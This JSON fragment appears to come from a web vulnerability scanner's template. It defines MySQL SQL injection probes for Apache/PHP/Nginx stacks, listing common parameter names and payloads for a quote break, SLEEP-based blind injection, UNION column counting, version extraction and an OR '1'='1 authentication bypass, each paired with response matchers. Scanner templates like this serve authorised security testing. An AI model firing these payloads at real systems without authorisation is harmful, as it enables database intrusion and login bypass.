    "mysql": {
      "description": "SQL injection probes targeting MySQL via Apache/PHP/Nginx stacks",
      "tech_match": [
        "Apache",
        "PHP",
        "MySQL",
        "Nginx"
      ],
      "param_match": [
        "id",
        "uid",
        "pid",
        "num",
        "page",
        "idx",
        "index",
        "cat",
        "item_id",
        "user_id",
        "order_id"
      ],
      "probes": [
        {
          "payload": "{{baseline}}'",
          "description": "Quote break to trigger MySQL syntax error",
          "matchers": [
            {
              "type": "status",
              "status": [
                500
              ]
            },
            {
              "type": "word",
              "words": [
                "sql syntax",
                "mysql",
                "warning:"
              ],
              "condition": "or"
            }
          ],
          "severity": "high",
          "confidence_boost": 50,
          "variables": {}
        },
        {
          "payload": "{{baseline}} AND SLEEP({{sleep}})--",
          "description": "MySQL time-based blind injection via SLEEP",
          "matchers": [
            {
              "type": "timing",
              "min_ms": 4000
            }
          ],
          "severity": "high",
          "confidence_boost": 60,
          "variables": {}
        },
        {
          "payload": "{{baseline}} UNION SELECT NULL,NULL,NULL--",
          "description": "MySQL UNION-based column count probe",
          "matchers": [
            {
              "type": "status",
              "status": [
                200
              ]
            },
            {
              "type": "length_diff",
              "min_diff": 200
            }
          ],
          "severity": "high",
          "confidence_boost": 40,
          "variables": {}
        },
        {
          "payload": "{{baseline}} AND 1=2 UNION SELECT 1,version(),3--",
          "description": "MySQL version extraction via UNION \u2014 look for MySQL/MariaDB version pattern in response body delta",
          "matchers": [
            {
              "type": "status",
              "status": [
                200
              ]
            },
            {
              "type": "length_diff",
              "min_diff": 5
            },
            {
              "type": "regex",
              "pattern": "\\b[0-9]+\\.[0-9]+\\.[0-9]+-?(MariaDB|ubuntu|log|debian|cll)?"
            }
          ],
          "severity": "high",
          "confidence_boost": 70,
          "variables": {}
        },
        {
          "payload": "{{baseline}}' OR '1'='1",
          "description": "Classic MySQL OR 1=1 authentication bypass",
          "matchers": [
            {
              "type": "length_diff",
              "min_diff": 200
            }
          ],
          "severity": "high",
          "confidence_boost": 35,
          "variables": {}
        }
      ]
    },
